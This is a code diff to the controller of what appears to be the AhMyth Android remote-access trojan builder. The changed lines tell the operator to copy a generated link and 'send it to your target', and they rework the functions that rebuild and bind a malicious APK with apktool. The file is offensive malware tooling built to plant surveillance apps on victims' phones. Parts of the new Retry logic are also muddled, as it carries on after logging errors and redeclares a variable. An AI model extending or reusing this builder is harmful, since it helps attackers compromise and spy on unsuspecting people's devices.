@@ -176,7 +176,9 @@ app.controller("AppCtrl", ($scope) => {
                         
                     }
                 if (stdout.length != 0) {
-                    $appCtrl.Log('Just Copy This Url And Send It To Your Target', CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.Log('Generating Link' + '...');
+                    $appCtrl.Log('Link Generated Successfully.', CONSTANTS.logStatus.SUCCESS);
+                    $appCtrl.Log('Copy the URL below, then send it to your target.', CONSTANTS.logStatus.SUCCESS);
                     $appCtrl.Log(stdout);
 
                     //console.log('exec error: ' + error);
@@ -5696,42 +5698,58 @@ function GetLauncherPath(manifest, smaliPath) {
 
     }
 
-    // function to build the apk and sign it by clicking the Retry button
-    $appCtrl.RetryApk = (apkFolder) => {
+    // function to use apktool to rebuild the decompiled apk folder selected with the folder browser
+    $appCtrl.RebuildApkFolder = (apkFolder) => {
+        $appCtrl.Log('Rebuilding ' + apkFolder + '...');
+        var rebuildApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -f -o "' + apkFolder + '"',
+            (error, stdout, stderr) => {
+                if (error !== null) {
+                    $appCtrl.Log('Rebuilding Failed', CONSTANTS.logStatus.FAIL);
+                    return;
+                }
 
-      $appCtrl.Log('Building ' + CONSTANTS.apkName + '...');
-      var createApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + apkFolder + '" -o "' + path.join(outputPath, CONSTANTS.apkName) + '"',
-          (error, stdout, stderr) => {
-              if (error !== null) {
-                  $appCtrl.Log('Building Failed', CONSTANTS.logStatus.FAIL);
-                  return;
-              }
-
-              $appCtrl.Log('Signing ' + CONSTANTS.apkName + '...');
-              var signApk = exec('java -jar "' + CONSTANTS.signApkJar + '" -a "' + path.join(outputPath, CONSTANTS.apkName) + '"',
-                  (error, stdout, stderr) => {
-                      if (error !== null) {
-                          $appCtrl.Log('Signing Failed', CONSTANTS.logStatus.FAIL);
-                          return;
-                      }
-
-
-                      fs.unlink(path.join(outputPath, CONSTANTS.apkName), (err) => {
-                          if (err) throw err;
-
-                          $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
-                          $appCtrl.Log("The apk has been built on " + path.join(outputPath), CONSTANTS.logStatus.SUCCESS);
-
-                      });
-                  });
-          });
-
-  }
-
-  $appCtrl.Retry = (apkFolder) => {
-    if (!apkFolder) {
-        $appCtrl.Log('Please Select a Decompiled APK folder to use.', CONSTANTS.logStatus.FAIL);
-        return;
+                $appCtrl.Log('Rebuilding Successful', CONSTANTS.logStatus.SUCCESS);
+            }
+        );
     }
-  }
 
+    // fired when user clicks the Retry button
+    // collect the filepath of the folder and try to build it
+    $appCtrl.Retry = (filePath) => {
+      if (!filePath) {
+          $appCtrl.Log('Error', CONSTANTS.logStatus.FAIL);
+          return;
+      }
+
+      // check if bind apk is enabled
+      if (!$appCtrl.bindApk.enable) {
+          $appCtrl.GenerateApk(CONSTANTS.ahmythApkFolderPath);
+
+      } else {
+      // generate a solid ahmyth apk from the folder selected
+          var filePath = $appCtrl.filePath;
+          if (filePath == null) {
+            $appCtrl.Log('Browse the APK folder you want to rebuild.');
+
+          } else if (!filePath.includes(".*")) {
+            $appCtrl.Log('It is not an APK folder.');
+
+          }
+
+          var apkFolder = filePath.substring(0, filePath.indexOf(".*"));
+          $appCtrl.Log('Rebuilding ' + apkFolder + '...');
+          var rebuildApk = exec('java -jar "' + CONSTANTS.apktoolJar + '" b "' + path.join(filePath, apkFolder) + '" -f -o "' + apkFolder + '"',
+              (error, stdout, stderr) => {
+                  if (error !== null) {
+                      $appCtrl.Log('Rebuilding Failed', CONSTANTS.logStatus.FAIL);
+                      return;
+                  }
+
+                  $appCtrl.Log('Rebuilding Successful', CONSTANTS.logStatus.SUCCESS);
+              }
+          );
+      }
+    }
+
+
+    
